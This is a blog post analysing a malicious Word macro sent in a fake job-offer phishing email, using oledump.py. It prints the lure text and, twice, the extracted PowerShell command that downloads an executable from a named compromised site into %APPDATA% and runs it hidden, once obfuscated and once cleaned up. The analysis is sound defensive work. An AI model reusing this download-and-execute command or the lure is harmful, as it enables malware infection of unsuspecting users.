---
title: "Analysis of a Word macro virus - 2701.doc"
date: 2017-01-27 10:46:08 +0100
draft: false
---

On 2017-01-27, I received a suspicious email on an address I no longer use.

EDIT: I received two more emails with the same file, only the message was different. Is it a recent ongoing spam campaign?

>Hello,

>My name is Adam Buchbinder, I saw your GitHub repo and i'm pretty amazed. 
The point is that i have an open position in my company and looks like you
are a good fit. 

>Please take a look into attachment to find details about company and job.
Dont hesitate to contact me directly via email highlighted in the document below. 

>Thanks and regards,
Adam.

Gmail refused to synchronise this email, saying it contained "a virus or a suspicious attached file". Indeed, opening the attached .doc file on my phone, I only saw a yellow screen telling me to "Enable macros to see this document". Highly suspicous!

<!-- more -->

According to VirusTotal, only 4/54 AVs detected this file as a threat.

![VirusTotal analysis](/images/vt_2701_doc.png)

I transfered the file to my computer to analyse it using Didier Stevens's fantastic [oledump.py](https://blog.didierstevens.com/programs/oledump-py/). First of all, I wanted to see what the malicious code looked like. This is easily done by checking which streams contain executable VBA code:

``./oledump.py 2701.doc``

    1:       114 '\x01CompObj'
    2:      4096 '\x05DocumentSummaryInformation'
    3:      4096 '\x05SummaryInformation'
    4:     11555 '1Table'
    5:       367 'Macros/PROJECT'
    6:        41 'Macros/PROJECTwm'
    7: M   84985 'Macros/VBA/ThisDocument'
    8:     16765 'Macros/VBA/_VBA_PROJECT'
    9:       517 'Macros/VBA/dir'
    10:       216 'MsoDataStore/\xc3\x90O\xc3\x904\xc3\x91\xc3\x9f\xc3\x84\xc3\x80\xc3\x84\xc3\x840\xc3\x9fLKL\xc3\x95CGFI\xc3\x89A==/Item'
    11:       341 'MsoDataStore/\xc3\x90O\xc3\x904\xc3\x91\xc3\x9f\xc3\x84\xc3\x80\xc3\x84\xc3\x840\xc3\x9fLKL\xc3\x95CGFI\xc3\x89A==/Properties'
    12:     15974 'WordDocument'

We can see that stream number 7 contains VBA code, so we'll extract it using the ``-s`` and ``-v`` switches.

``./oledump.py 2701.doc -s 7 -v``

    Attribute VB_Name = "ThisDocument"
    Attribute VB_Base = "1Normal.ThisDocument"
    Attribute VB_GlobalNameSpace = False
    Attribute VB_Creatable = False
    Attribute VB_PredeclaredId = True
    Attribute VB_Exposed = True
    Attribute VB_TemplateDerived = True
    Attribute VB_Customizable = True
    Function ytesobpu()
    ytesobpu = "oswoqhy"
    
    ...snipping about 2000 lines...
    
    yvluxju = "24940"
    urucahinc = "99405"
    tniwfi = "yjunyk"
    bcukifx = "75236"
    mfihmuwz = "12310"
    ymuba = tniwfi + bcukifx & "10481" + egebi & mfihmuwz
     
    End If
    
    End Sub

Okay, if you want to sniff through it [go ahead](/assets/documents/2701.doc.vba), but I'm no doing it. oledump has a nice option to try and extract any HTTP calls in an OLE document, so we'll just use that.

``./oledump.py 2701.doc -p plugin_http_heuristics``


    1:       114 '\x01CompObj'
    2:      4096 '\x05DocumentSummaryInformation'
    3:      4096 '\x05SummaryInformation'
    4:     11555 '1Table'
    5:       367 'Macros/PROJECT'
    6:        41 'Macros/PROJECTwm'
    7: M   84985 'Macros/VBA/ThisDocument'
               Plugin: HTTP Heuristics plugin 
                 "CMD.exe /C poWe^RsH^E^lL.EX^e     ^-eXE^CUT^I^o^n^Po^LI^Cy byp^As^s^    ^-N^Opr^O^Fi^l^e -^winDowST^yLE^    h^IDden   ^(n^e^W-O^bje^CT^    s^ySte^M^.^NET.W^Eb^cLi^En^T^)^.^dOW^Nl^oa^d^FI^lE('http://nicklovegrove.co.uk/wp-content/margin2601_onechat_word.exe','%APPdAta%.Exe');s^TArT-pRO^C^Es^S '%APpdaTa%.ExE'"
    8:     16765 'Macros/VBA/_VBA_PROJECT'
    9:       517 'Macros/VBA/dir'
    10:       216 'MsoDataStore/\xc3\x90O\xc3\x904\xc3\x91\xc3\x9f\xc3\x84\xc3\x80\xc3\x84\xc3\x840\xc3\x9fLKL\xc3\x95CGFI\xc3\x89A==/Item'
    11:       341 'MsoDataStore/\xc3\x90O\xc3\x904\xc3\x91\xc3\x9f\xc3\x84\xc3\x80\xc3\x84\xc3\x840\xc3\x9fLKL\xc3\x95CGFI\xc3\x89A==/Properties'
    12:     15974 'WordDocument'
 
 By cleaning up the command, here's what we can see:
 
 ``` shell
 cmd.exe /C powershell.exe 
 -executionPolicy bypass 
 -noProfile 
 -windowStyle hidden 
 (newObject System.NET.WebClient)
     .downloadFile('http://nicklovegrove.co.uk/wp-content/margin2601_onechat_word.exe', 
	               '%APPDATA%.exe'); 
 start-process '%APPDATA%.exe'
 ```
 
 Looks like the macro tries to download a file at http://nicklovegrove.co.uk , probably a hacked WordPress site (seriously, update your WordPress!).
 
 This file ``margin2601_onechat_word.exe`` gets a score of 6/54 on VirusTotal.
 
 ![VirusTotal's result on the EXE file](/images/vt_margin_exe.png)
 
 
Analysing it on [Hybrid-Analysis](https://hybrid-analysis.com) shows that the virus drops a malicious DLL file (``bckedip.dll``) on the target machine (the file is detected as a trojan). It also does POST requests to ``onechat.pw``.

[Here's a link to the analysis](https://www.hybrid-analysis.com/sample/3f73b09d9cdd100929061d8590ef0bc01b47999f47fa024f57c28dcd660e7c22?environmentId=100)

Further analysis on a Virtual Machine could be interesting.
